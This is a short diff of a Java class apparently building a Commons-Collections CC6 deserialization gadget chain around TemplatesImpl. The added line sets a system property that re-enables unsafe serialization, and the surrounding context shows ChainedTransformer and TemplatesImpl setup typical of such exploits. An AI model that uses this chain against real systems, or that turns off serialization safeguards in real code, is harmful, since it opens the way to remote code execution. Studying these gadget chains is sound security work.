@@ -26,8 +26,8 @@ public class cc6Templateslmpl {
 //        };
 //        //尾部chain
 //        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
-
-
+        //补充安全省略设置
+        System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");
         //进行TemplatesLmpl替换
         TemplatesImpl templates = new TemplatesImpl();
         Class templatesClass = templates.getClass();
